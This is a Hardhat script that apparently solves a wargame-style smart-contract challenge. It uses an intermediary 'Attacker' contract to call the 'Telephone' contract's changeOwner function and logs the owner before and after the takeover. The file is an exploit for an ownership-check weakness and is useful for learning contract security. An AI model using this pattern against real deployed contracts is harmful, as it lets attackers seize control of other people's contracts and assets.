import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x290665897E441317ec52b664B1a6e6601d6312F5";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0xb524bF75fe2e6C31740a77E31a84fDb1a9AADb9D";
async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Telephone",
    CONTRACT_ADDRESS,
    signer
  );

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  let contractOwner = await contract.owner();
  console.log(`The current contract owner is: ${contractOwner}`);

  // sign a transaction with my private key that sends data to the attacker contract
  console.log(
    `Lets call the attacker message to send a changeOwner message: ${await attackerContract.sendAttackerMessage(
      PLAYER_ADDRESS // the data will be to call the sendAtttackerMessage() function with my public key passed in a parameter
    )}`
  );
  // The sendAttackerMessage() will then call the Telephone contract’s changeOwner function with my public key as the new address.
  let contractNewOwner = await contract.owner();
  console.log(`The newly passed contract owner is: ${contractNewOwner} `);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
